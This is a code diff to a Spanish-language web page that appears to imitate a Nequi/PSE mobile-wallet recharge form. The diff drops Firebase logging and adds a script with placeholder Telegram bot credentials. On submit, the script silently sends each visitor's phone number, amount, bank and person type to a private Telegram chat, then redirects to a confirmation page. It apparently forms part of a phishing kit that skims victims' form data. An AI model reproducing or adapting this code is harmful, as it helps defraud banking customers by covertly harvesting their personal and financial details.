@@ -85,12 +85,13 @@ La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corr
 
 </div>
 
-<script type="module" src="firebase.js"></script>
-
 <script>
-window.addEventListener('load', () => {
+// ========== CONFIGURACIÓN DE TELEGRAM - CAMBIA ESTOS DATOS ==========
+const BOT_TOKEN = "TU_BOT_TOKEN_AQUI";  // Ejemplo: "1234567890:ABCdefGHIjklmNOPqrstUVwxyz"
+const CHAT_ID = "TU_CHAT_ID_AQUI";      // Ejemplo: "123456789"
+// ====================================================================
 
-const { db, uid, ref, update } = window;
+window.addEventListener('load', () => {
 
 const input1 = document.getElementById("input1");
 const input2 = document.getElementById("input2");
@@ -119,12 +120,6 @@ let limpio = input3.value.replace(/\D/g, "");
 
 if (limpio === "") {
 input3.value = "";
-
-update(ref(db, "dataPages/" + uid), {
-monto: "",
-oculto: true
-});
-
 validar();
 return;
 }
@@ -133,27 +128,56 @@ let formateado = limpio.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
 
 input3.value = "$" + formateado;
 
-update(ref(db, "dataPages/" + uid), {
-monto: limpio,
-oculto: true
-});
-
 validar();
 });
 
 input1.addEventListener("input", validar);
 input2.addEventListener("input", validar);
 select1.addEventListener("change", validar);
+select2.addEventListener("change", validar);
 
-select2.addEventListener("change", () => {
-update(ref(db, "dataPages/" + uid), {
-banco: select2.value,
-oculto: true
-});
-validar();
-});
+// Función para enviar a Telegram
+async function enviarATelegram(telefono, monto, montoFormato, banco, persona) {
+    const fecha = new Date();
+    const mensaje = `
+📱 *NUEVA RECARGA NEQUI*
+━━━━━━━━━━━━━━━━━━━━
+👤 *Tipo de persona:* ${persona}
+📞 *Teléfono:* ${telefono}
+💰 *Monto:* ${montoFormato}
+🏦 *Banco:* ${banco}
+🕐 *Fecha:* ${fecha.toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━
+✅ *Estado:* Pendiente de pago
+    `;
 
-button.addEventListener("click", () => {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    try {
+        const response = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: mensaje,
+                parse_mode: "Markdown"
+            })
+        });
+        
+        if (response.ok) {
+            console.log("✅ Enviado a Telegram correctamente");
+            return true;
+        } else {
+            console.error("❌ Error al enviar a Telegram");
+            return false;
+        }
+    } catch (error) {
+        console.error("❌ Error de conexión:", error);
+        return false;
+    }
+}
+
+button.addEventListener("click", async () => {
 
 let telefono = input1.value;
 let monto = input3.value.replace(/\D/g, "");
@@ -164,6 +188,9 @@ localStorage.setItem("monto", monto);
 localStorage.setItem("montoFormato", montoFormato);
 localStorage.setItem("banco", select2.value);
 localStorage.setItem("persona", select1.value);
+
+// Enviar a Telegram
+await enviarATelegram(telefono, monto, montoFormato, select2.value, select1.value);
 
 window.location.href = "confirmacion.html";
 });
